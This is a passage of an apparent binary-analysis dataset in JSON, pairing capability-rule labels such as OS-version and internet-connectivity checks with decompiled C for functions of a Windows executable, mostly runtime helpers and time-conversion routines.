            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00454ed2(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\n            *arg_ch = -1;\n        }\n        else {\n            *arg_ch = *arg_ch + 1;\n        }\n        uVar2 = *in_ECX & 0xffffff00 | *(*in_ECX + 3);\n    }\n    else {\n        *arg_ch = *arg_ch + 1;\n        (*in_ECX)[2] = (*in_ECX)[2] + 1;\n        ***in_ECX = arg_8h;\n        piVar1 = *in_ECX;\n        *piVar1 = *piVar1 + 1;\n        uVar2 = CONCAT31(piVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 244
    },
    "00454f14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00454f14(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\n            *arg_ch = -1;\n        }\n        else {\n            *arg_ch = *arg_ch + 1;\n        }\n        uVar2 = *in_ECX & 0xffffff00 | *(*in_ECX + 3);\n    }\n    else {\n        *arg_ch = *arg_ch + 1;\n        (*in_ECX)[2] = (*in_ECX)[2] + 1;\n        ***in_ECX = arg_8h;\n        piVar1 = *in_ECX;\n        *piVar1 = *piVar1 + 2;\n        uVar2 = CONCAT31(piVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 244
    },
    "00454fd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454fd0(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint in_stack_ffffffd8;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') || (*piVar1 < 1)) {\n        in_stack_ffffffd8 = *(param_1 + 8);\n        fcn.00455870(*(param_1 + 0x30), *piVar1, param_1 + 0x14, in_stack_ffffffd8);\n    }\n    else {\n        puVar4 = *(param_1 + 0x30);\n        var_14h = 0;\n        do {\n            uVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar3 = fcn.0045eb63(&var_10h, &var_ch, 6, uVar2, *(param_1 + 8));\n            if ((iVar3 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.00455870(&var_ch, var_10h, param_1 + 0x14, *(param_1 + 8));\n            var_14h = var_14h + 1;\n        } while (var_14h != *piVar1);\n    }\n    fcn.004303e9(in_stack_ffffffd8);\n    return;\n}\n",
        "token_count": 430
    },
    "0045507b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045507b(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint in_stack_ffffffd8;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') || (*piVar1 < 1)) {\n        in_stack_ffffffd8 = *(param_1 + 8);\n        fcn.00455870(*(param_1 + 0x30), *piVar1, param_1 + 0x14, in_stack_ffffffd8);\n    }\n    else {\n        puVar4 = *(param_1 + 0x30);\n        var_14h = 0;\n        do {\n            uVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar3 = fcn.0045eb63(&var_10h, &var_ch, 6, uVar2, *(param_1 + 8));\n            if ((iVar3 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.00455870(&var_ch, var_10h, param_1 + 0x14, *(param_1 + 8));\n            var_14h = var_14h + 1;\n        } while (var_14h != *piVar1);\n    }\n    fcn.004303e9(in_stack_ffffffd8);\n    return;\n}\n",
        "token_count": 430
    },
    "00455126": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455126(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint in_stack_ffffffd8;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') || (*piVar1 < 1)) {\n        in_stack_ffffffd8 = *(param_1 + 8);\n        fcn.00455870(*(param_1 + 0x30), *piVar1, param_1 + 0x14, in_stack_ffffffd8);\n    }\n    else {\n        puVar4 = *(param_1 + 0x30);\n        var_14h = 0;\n        do {\n            uVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar3 = fcn.0045eb63(&var_10h, &var_ch, 6, uVar2, *(param_1 + 8));\n            if ((iVar3 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.00455870(&var_ch, var_10h, param_1 + 0x14, *(param_1 + 8));\n            var_14h = var_14h + 1;\n        } while (var_14h != *piVar1);\n    }\n    fcn.004303e9(in_stack_ffffffd8);\n    return;\n}\n",
        "token_count": 429
    },
    "004551d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004551d1(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint in_stack_ffffffd8;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') || (*piVar1 < 1)) {\n        in_stack_ffffffd8 = *(param_1 + 8);\n        fcn.004558c8(*(param_1 + 0x30), *piVar1, param_1 + 0x14);\n    }\n    else {\n        puVar4 = *(param_1 + 0x30);\n        var_14h = 0;\n        do {\n            uVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar3 = fcn.0045eb63(&var_10h, &var_ch, 6, uVar2, *(param_1 + 8));\n            if ((iVar3 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.004558c8(&var_ch, var_10h, param_1 + 0x14);\n            var_14h = var_14h + 1;\n        } while (var_14h != *piVar1);\n    }\n    fcn.004303e9(in_stack_ffffffd8);\n    return;\n}\n",
        "token_count": 417
    },
    "0045527c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045527c(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint in_stack_ffffffd8;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') || (*piVar1 < 1)) {\n        in_stack_ffffffd8 = *(param_1 + 8);\n        fcn.004558c8(*(param_1 + 0x30), *piVar1, param_1 + 0x14);\n    }\n    else {\n        puVar4 = *(param_1 + 0x30);\n        var_14h = 0;\n        do {\n            uVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar3 = fcn.0045eb63(&var_10h, &var_ch, 6, uVar2, *(param_1 + 8));\n            if ((iVar3 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.004558c8(&var_ch, var_10h, param_1 + 0x14);\n            var_14h = var_14h + 1;\n        } while (var_14h != *piVar1);\n    }\n    fcn.004303e9(in_stack_ffffffd8);\n    return;\n}\n",
        "token_count": 417
    },
    "00455327": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455327(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint in_stack_ffffffd8;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') || (*piVar1 < 1)) {\n        in_stack_ffffffd8 = *(param_1 + 8);\n        fcn.004558c8(*(param_1 + 0x30), *piVar1, param_1 + 0x14);\n    }\n    else {\n        puVar4 = *(param_1 + 0x30);\n        var_14h = 0;\n        do {\n            uVar2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar3 = fcn.0045eb63(&var_10h, &var_ch, 6, uVar2, *(param_1 + 8));\n            if ((iVar3 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.004558c8(&var_ch, var_10h, param_1 + 0x14);\n            var_14h = var_14h + 1;\n        } while (var_14h != *piVar1);\n    }\n    fcn.004303e9(in_stack_ffffffd8);\n    return;\n}\n",
        "token_count": 416
    },
    "004553d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004553d2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x38) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x34))) {\n        iVar1 = *(param_1 + 8);\n        if (*(iVar1 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        arg_ch = *(param_1 + 0x30);\n        if (*(param_1 + 0x34) != 0) {\n            do {\n                var_4h = var_4h & 0xffff0000;\n                iVar2 = fcn.0045ee07(&var_4h, arg_ch, *(*(iVar1 + 0xc) + 4), *(param_1 + 8));\n                if (iVar2 < 1) {\n                    *(param_1 + 0x14) = 0xffffffff;\n                    return 1;\n                }\n                fcn.00454eb0(var_4h, param_1 + 0x14, *(param_1 + 8));\n                arg_ch = arg_ch + iVar2;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != *(param_1 + 0x34));\n        }\n    }\n    else {\n        fcn.0045589c(*(param_1 + 0x30), *(param_1 + 0x34), param_1 + 0x14, *(param_1 + 8));\n    }\n    return 1;\n}\n",
        "token_count": 407
    },
    "0045547f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045547f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x38) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x34))) {\n        iVar1 = *(param_1 + 8);\n        if (*(iVar1 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        arg_ch = *(param_1 + 0x30);\n        if (*(param_1 + 0x34) != 0) {\n            do {\n                var_4h = var_4h & 0xffff0000;\n                iVar2 = fcn.0045ee07(&var_4h, arg_ch, *(*(iVar1 + 0xc) + 4), *(param_1 + 8));\n                if (iVar2 < 1) {\n                    *(param_1 + 0x14) = 0xffffffff;\n                    return 1;\n                }\n                fcn.00454eb0(var_4h, param_1 + 0x14, *(param_1 + 8));\n                arg_ch = arg_ch + iVar2;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != *(param_1 + 0x34));\n        }\n    }\n    else {\n        fcn.0045589c(*(param_1 + 0x30), *(param_1 + 0x34), param_1 + 0x14, *(param_1 + 8));\n    }\n    return 1;\n}\n",
        "token_count": 407
    },
    "0045552c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045552c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x38) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x34))) {\n        iVar1 = *(param_1 + 8);\n        if (*(iVar1 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        arg_ch = *(param_1 + 0x30);\n        if (*(param_1 + 0x34) != 0) {\n            do {\n                var_4h = var_4h & 0xffff0000;\n                iVar2 = fcn.0045ee07(&var_4h, arg_ch, *(*(iVar1 + 0xc) + 4), *(param_1 + 8));\n                if (iVar2 < 1) {\n                    *(param_1 + 0x14) = 0xffffffff;\n                    return 1;\n                }\n                fcn.00454eb0(var_4h, param_1 + 0x14, *(param_1 + 8));\n                arg_ch = arg_ch + iVar2;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != *(param_1 + 0x34));\n        }\n    }\n    else {\n        fcn.0045589c(*(param_1 + 0x30), *(param_1 + 0x34), param_1 + 0x14, *(param_1 + 8));\n    }\n    return 1;\n}\n",
        "token_count": 407
    },
    "004555d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004555d9(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_ch;\n    int32_t iVar5;\n    bool bVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') && (iVar5 = 0,  0 < *piVar1)) {\n        iVar2 = *(param_1 + 8);\n        if (*(iVar2 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        arg_ch = *(param_1 + 0x30);\n        bVar6 = *piVar1 == 0;\n        while (!bVar6) {\n            var_4h._0_2_ = 0;\n            iVar4 = fcn.0045ee07(&var_4h, arg_ch, *(*(iVar2 + 0xc) + 4), *(param_1 + 8));\n            if (iVar4 < 1) {\n                *(param_1 + 0x14) = 0xffffffff;\n                return 1;\n            }\n            iVar3 = *(param_1 + 0x448);\n            if (*(iVar3 + 8) == *(iVar3 + 4)) {\n                if (*(iVar3 + 0xc) == '\\0') {\n                    *(param_1 + 0x14) = 0xffffffff;\n                }\n                else {\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                }\n            }\n            else {\n                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                *(iVar3 + 8) = *(iVar3 + 8) + 1;\n                ***(param_1 + 0x448) = var_4h;\n                **(param_1 + 0x448) = **(param_1 + 0x448) + 2;\n            }\n            arg_ch = arg_ch + iVar4;\n            iVar5 = iVar5 + 1;\n            bVar6 = iVar5 == *piVar1;\n        }\n    }\n    else {\n        fcn.0045592f(*(param_1 + 0x30), *piVar1, param_1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 592
    },
    "004556b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004556b6(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_ch;\n    int32_t iVar5;\n    bool bVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') && (iVar5 = 0,  0 < *piVar1)) {\n        iVar2 = *(param_1 + 8);\n        if (*(iVar2 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        arg_ch = *(param_1 + 0x30);\n        bVar6 = *piVar1 == 0;\n        while (!bVar6) {\n            var_4h._0_2_ = 0;\n            iVar4 = fcn.0045ee07(&var_4h, arg_ch, *(*(iVar2 + 0xc) + 4), *(param_1 + 8));\n            if (iVar4 < 1) {\n                *(param_1 + 0x14) = 0xffffffff;\n                return 1;\n            }\n            iVar3 = *(param_1 + 0x448);\n            if (*(iVar3 + 8) == *(iVar3 + 4)) {\n                if (*(iVar3 + 0xc) == '\\0') {\n                    *(param_1 + 0x14) = 0xffffffff;\n                }\n                else {\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                }\n            }\n            else {\n                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                *(iVar3 + 8) = *(iVar3 + 8) + 1;\n                ***(param_1 + 0x448) = var_4h;\n                **(param_1 + 0x448) = **(param_1 + 0x448) + 2;\n            }\n            arg_ch = arg_ch + iVar4;\n            iVar5 = iVar5 + 1;\n            bVar6 = iVar5 == *piVar1;\n        }\n    }\n    else {\n        fcn.0045592f(*(param_1 + 0x30), *piVar1, param_1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 592
    },
    "00455793": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00455793(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_ch;\n    int32_t iVar5;\n    bool bVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = param_1 + 0x34;\n    if ((*(param_1 + 0x38) == '\\0') && (iVar5 = 0,  0 < *piVar1)) {\n        iVar2 = *(param_1 + 8);\n        if (*(iVar2 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        arg_ch = *(param_1 + 0x30);\n        bVar6 = *piVar1 == 0;\n        while (!bVar6) {\n            var_4h._0_2_ = 0;\n            iVar4 = fcn.0045ee07(&var_4h, arg_ch, *(*(iVar2 + 0xc) + 4), *(param_1 + 8));\n            if (iVar4 < 1) {\n                *(param_1 + 0x14) = 0xffffffff;\n                return 1;\n            }\n            iVar3 = *(param_1 + 0x448);\n            if (*(iVar3 + 8) == *(iVar3 + 4)) {\n                if (*(iVar3 + 0xc) == '\\0') {\n                    *(param_1 + 0x14) = 0xffffffff;\n                }\n                else {\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                }\n            }\n            else {\n                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                *(iVar3 + 8) = *(iVar3 + 8) + 1;\n                ***(param_1 + 0x448) = var_4h;\n                **(param_1 + 0x448) = **(param_1 + 0x448) + 2;\n            }\n            arg_ch = arg_ch + iVar4;\n            iVar5 = iVar5 + 1;\n            bVar6 = iVar5 == *piVar1;\n        }\n    }\n    else {\n        fcn.0045592f(*(param_1 + 0x30), *piVar1, param_1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 591
    },
    "00456272": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456272(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x16;\n        fcn.0043bb3e();\n    }\n    else if (arg_ch == 1) {\n        var_8h = 0;\n        var_4h = 0;\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&var_8h);\n        uVar4 = var_8h + 0x2ac18000;\n        iVar3 = (var_4h + -0x19db1de) - (var_8h < 0xd53e8000);\n        if ((iVar3 < 0x4c4b25) && ((iVar3 < 0x4c4b24 || (uVar4 < 0xe1404000)))) {\n            uVar2 = fcn.00476cf0(uVar4, iVar3, 10000000, 0);\n            *arg_8h = uVar2;\n            iVar3 = fcn.00476da0(uVar4, iVar3, 10000000, 0);\n            arg_8h[1] = iVar3 * 100;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 357
    },
    "00456303": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456303(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x16;\n        fcn.0043bb3e();\n    }\n    else if (arg_ch == 1) {\n        var_8h = 0;\n        var_4h = 0;\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&var_8h);\n        uVar3 = var_8h + 0x2ac18000;\n        iVar2 = (var_4h + -0x19db1de) - (var_8h < 0xd53e8000);\n        if ((iVar2 < 0x483f079) && ((iVar2 < 0x483f078 || (uVar3 < 0xdd478000)))) {\n            uVar4 = fcn.00476cf0(uVar3, iVar2, 10000000, 0);\n            *arg_8h = uVar4;\n            arg_8h[1] = uVar4 >> 0x20;\n            iVar2 = fcn.00476da0(uVar3, iVar2, 10000000, 0);\n            arg_8h[2] = iVar2 * 100;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 370
    },
    "00456397": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456397(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x16;\n        fcn.0043bb3e();\n    }\n    else if (arg_ch == 1) {\n        var_8h = 0;\n        var_4h = 0;\n        fcn.0046058b(&var_8h);\n        uVar4 = var_8h + 0x2ac18000;\n        iVar3 = (var_4h + -0x19db1de) - (var_8h < 0xd53e8000);\n        if ((iVar3 < 0x4c4b25) && ((iVar3 < 0x4c4b24 || (uVar4 < 0xe1404000)))) {\n            uVar2 = fcn.00476cf0(uVar4, iVar3, 10000000, 0);\n            *arg_8h = uVar2;\n            iVar3 = fcn.00476da0(uVar4, iVar3, 10000000, 0);\n            arg_8h[1] = iVar3 * 100;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 349
    },
    "00456427": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456427(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x16;\n        fcn.0043bb3e();\n    }\n    else if (arg_ch == 1) {\n        var_8h = 0;\n        var_4h = 0;\n        fcn.0046058b(&var_8h);\n        uVar3 = var_8h + 0x2ac18000;\n        iVar2 = (var_4h + -0x19db1de) - (var_8h < 0xd53e8000);\n        if ((iVar2 < 0x483f079) && ((iVar2 < 0x483f078 || (uVar3 < 0xdd478000)))) {\n            uVar4 = fcn.00476cf0(uVar3, iVar2, 10000000, 0);\n            *arg_8h = uVar4;\n            arg_8h[1] = uVar4 >> 0x20;\n            iVar2 = fcn.00476da0(uVar3, iVar2, 10000000, 0);\n            arg_8h[2] = iVar2 * 100;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 362
    },
    "00456749": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456749(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    uint32_t **ppuVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    uint var_4h;\n    \n    ppuVar4 = fcn.0045cfb4();\n    if (ppuVar4 != NULL) {\n        puVar1 = *ppuVar4;\n        for (puVar6 = puVar1; puVar6 != puVar1 + 0x24; puVar6 = puVar6 + 3) {\n            if (*puVar6 == arg_8h) {\n                if (puVar6 == NULL) {\n                    return 0;\n                }\n                pcVar2 = puVar6[2];\n                if (pcVar2 == NULL) {\n                    return 0;\n                }\n                if (pcVar2 == 0x5) {\n                    puVar6[2] = 0;\n                    return 1;\n                }\n                if (pcVar2 != 0x1) {\n                    puVar3 = ppuVar4[1];\n                    ppuVar4[1] = arg_ch;\n                    if (puVar6[1] == 8) {\n                        for (puVar5 = puVar1 + 9; puVar5 != puVar1 + 0x24; puVar5 = puVar5 + 3) {\n                            puVar5[2] = 0;\n                        }\n                        puVar1 = ppuVar4[2];\n                        puVar5 = puVar1;\n                        if (*puVar6 < 0xc0000092) {\n                            if (*puVar6 == 0xc0000091) {\n                                puVar5 = 0x84;\n                            }\n                            else if (*puVar6 == 0xc000008d) {\n                                puVar5 = 0x82;\n                            }\n                            else if (*puVar6 == 0xc000008e) {\n                                puVar5 = 0x83;\n                            }\n                            else if (*puVar6 == 0xc000008f) {\n                                puVar5 = 